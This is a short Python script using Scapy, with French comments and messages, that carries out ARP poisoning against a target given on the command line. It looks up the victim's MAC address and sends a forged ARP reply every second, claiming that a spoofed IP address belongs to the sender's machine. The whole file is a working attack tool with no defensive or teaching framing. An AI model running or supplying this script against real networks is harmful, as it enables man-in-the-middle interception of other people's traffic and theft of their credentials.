#!/usr/bin/env python3
from scapy.all import ARP, Ether, sendp, getmacbyip
import sys
import time

if len(sys.argv) != 3:
    print("Usage: python arp_poisoning.py <VICTIM_IP> <FAKE_IP>")
    sys.exit(1)

victim_ip = sys.argv[1]
fake_ip   = sys.argv[2]

print(f"[*] Résolution du MAC de la victime {victim_ip}...")
victim_mac = getmacbyip(victim_ip)

if victim_mac is None:
    print(f"[!] Impossible de résoudre le MAC de {victim_ip}, est-il joignable ?")
    sys.exit(1)

print(f"[*] MAC de la victime : {victim_mac}")
print(f"[*] ARP Poisoning : on dit à {victim_ip} que {fake_ip} c'est nous")
print("[*] Ctrl+C pour arrêter\n")

packet = Ether(dst=victim_mac) / ARP(
    op=2,            # ARP Reply
    pdst=victim_ip,  # IP victime
    hwdst=victim_mac,# MAC victime
    psrc=fake_ip,    # IP qu'on usurpe
    # hwsrc = notre MAC (auto par Scapy)
)

while True:
    sendp(packet, verbose=False)
    print(f"[+] Envoyé : {fake_ip} is-at NOTRE_MAC → {victim_ip} ({victim_mac})")
    time.sleep(1)
